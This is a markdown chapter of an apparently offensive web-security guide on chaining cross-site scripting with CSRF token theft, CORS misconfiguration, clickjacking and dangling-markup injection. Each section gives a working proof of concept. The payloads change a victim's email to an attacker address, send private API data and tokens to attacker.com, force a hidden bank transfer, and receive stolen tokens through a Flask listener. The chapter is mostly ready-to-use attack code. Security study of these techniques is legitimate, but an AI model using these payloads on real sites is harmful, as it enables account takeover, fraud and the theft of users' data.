# 07 — XSS Chaining

## Overview

XSS alone — while high-impact — becomes critical when chained with other vulnerabilities. Each chain in this document converts reflected or stored script execution into a higher-impact outcome: account takeover, credentialed API exfiltration, forced actions, or cross-origin token theft. Each section includes attacker steps, victim preconditions, impact, and a working PoC.

---

## 1. XSS + CSRF: Token Theft → Account Takeover

### Preconditions

- Stored or reflected XSS on the target application
- The application uses CSRF tokens to protect state-changing actions
- The sensitive action (password change, email change) is on the same origin as the XSS

### Attack Steps

1. Attacker identifies XSS injection point.
2. Attacker identifies the target action (e.g., `POST /account/change-email`).
3. XSS payload fetches the page containing the CSRF token, extracts it, then submits the forged request.

### PoC

```javascript
// XSS payload — exfiltrates CSRF token then changes victim's email
(async () => {
  // Step 1: Fetch the settings page to get a valid CSRF token
  const resp = await fetch('/account/settings', { credentials: 'include' });
  const html = await resp.text();

  // Step 2: Extract CSRF token from the page
  const doc = new DOMParser().parseFromString(html, 'text/html');
  const token = doc.querySelector('meta[name="csrf-token"]')?.content
              || doc.querySelector('input[name="_token"]')?.value;

  // Step 3: Submit the state-changing request with the stolen token
  await fetch('/account/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-CSRF-Token': token
    },
    body: `email=attacker%40evil.com&_token=${encodeURIComponent(token)}`
  });

  // Step 4: Confirm
  new Image().src = 'https://attacker.com/log?status=done&origin=' + location.origin;
})();
```

### Impact

Full account takeover without stealing session cookies. Works even with `HttpOnly` cookies, since the browser sends cookies automatically with credentialed `fetch`.

---

## 2. XSS + CORS Misconfiguration: Credentialed API Exfiltration

### Preconditions

- XSS on `app.victim.com`
- An API endpoint at `api.victim.com` that:
  - Reflects the `Origin` header in `Access-Control-Allow-Origin`
  - Returns `Access-Control-Allow-Credentials: true`
- The API returns sensitive data (user profile, tokens, secrets)

### Attack Steps

1. XSS payload runs on `app.victim.com`.
2. Payload sends a credentialed cross-origin request to `api.victim.com`.
3. Because the CORS policy reflects the origin and allows credentials, the browser permits reading the response.
4. Payload exfiltrates the JSON response to the attacker's server.

### PoC

```javascript
// XSS payload on app.victim.com
(async () => {
  // This fetch is same-site: app.victim.com → api.victim.com
  // CORS is required only if cross-origin; often api.victim.com reflects origins
  const resp = await fetch('https://api.victim.com/v1/user/profile', {
    credentials: 'include'   // sends session cookies
  });

  if (!resp.ok) {
    new Image().src = 'https://attacker.com/err?status=' + resp.status;
    return;
  }

  const data = await resp.json();

  // Exfiltrate via POST to avoid URL length limits
  navigator.sendBeacon('https://attacker.com/exfil', JSON.stringify({
    origin: location.origin,
    api: 'https://api.victim.com/v1/user/profile',
    data
  }));
})();
```

### Impact

Attacker reads private API responses (e.g., PII, access tokens, internal IDs) using the victim's authenticated session, without needing to steal cookies.

---

## 3. XSS + Clickjacking: Double-Click Attack

### Preconditions

- XSS on a less-sensitive page (`blog.victim.com`) that can open or influence a sensitive page
- The sensitive page (`bank.victim.com/transfer`) is missing `X-Frame-Options`/`frame-ancestors 'none'`
- The sensitive action is triggered by a single button click

### Attack Steps

1. XSS payload opens `bank.victim.com/transfer` in a hidden iframe.
2. The iframe is positioned over a button in the attacker-controlled overlay.
3. The victim's click (intended for the overlay button) lands on the iframe button.
4. The transfer is submitted with the victim's session.

### PoC

```javascript
// XSS payload — sets up the clickjacking overlay
const iframe = document.createElement('iframe');
iframe.src = 'https://bank.victim.com/transfer?amount=5000&to=attacker';
iframe.style.cssText = `
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  opacity: 0.01;   /* invisible but clickable */
  z-index: 9999;
  border: none;
`;
document.body.appendChild(iframe);

// Overlay instructions to guide the click
const overlay = document.createElement('div');
overlay.innerHTML = '<p style="font-size:2em;margin-top:200px;text-align:center">Click here to claim your reward!</p>';
overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;background:#fff';
document.body.appendChild(overlay);
```

### Impact

Forced submission of authenticated actions (fund transfers, settings changes, OAuth authorizations) using the victim's session.

---

## 4. XSS + Dangling Markup: Nonce/Token Exfiltration Without Full XSS

Dangling markup injection is used when a script cannot execute (e.g., CSP blocks inline scripts) but HTML injection is possible. It exfiltrates content that appears after the injection point in the page source.

### Preconditions

- HTML injection without JavaScript execution (CSP blocks scripts)
- A nonce, CSRF token, or other secret appears in the page source *after* the injection point

### Attack Steps

1. Inject an unclosed HTML attribute that starts an `src` or `action` URL.
2. The browser constructs the attribute value by consuming all characters up to the next matching quote, including the token.
3. The browser makes a request to the attacker's server with the token as part of the URL.

### PoC

```html
<!-- Injection into a search input that reflects into: <input value="INJECTION"> -->
<!-- Inject: -->
"><img src="https://attacker.com/steal?d=

<!-- Full page source becomes:
<input value=""><img src="https://attacker.com/steal?d=
<input type="hidden" name="csrf" value="SECRET_TOKEN">  ← this ends up in the URL
...
">
The browser fetches: https://attacker.com/steal?d=\n<input type="hidden" name="csrf" value="SECRET_TOKEN">
-->
```

```python
# Attacker's listener (Python Flask)
from flask import Flask, request
app = Flask(__name__)

@app.route('/steal')
def steal():
    print('[STOLEN]', request.args.get('d', ''))
    return '', 200
```

### Impact

Nonce or CSRF token exfiltration, enabling follow-up attacks (CSP bypass, CSRF exploitation) even when XSS is partially mitigated.

---

## References

- [XSS + CSRF Chaining — PortSwigger Web Academy](https://portswigger.net/web-security/csrf)
- [Exploiting CORS Misconfigurations — James Kettle](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
- [Dangling Markup Injection — PortSwigger Research](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
- [Clickjacking Defense Cheat Sheet — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
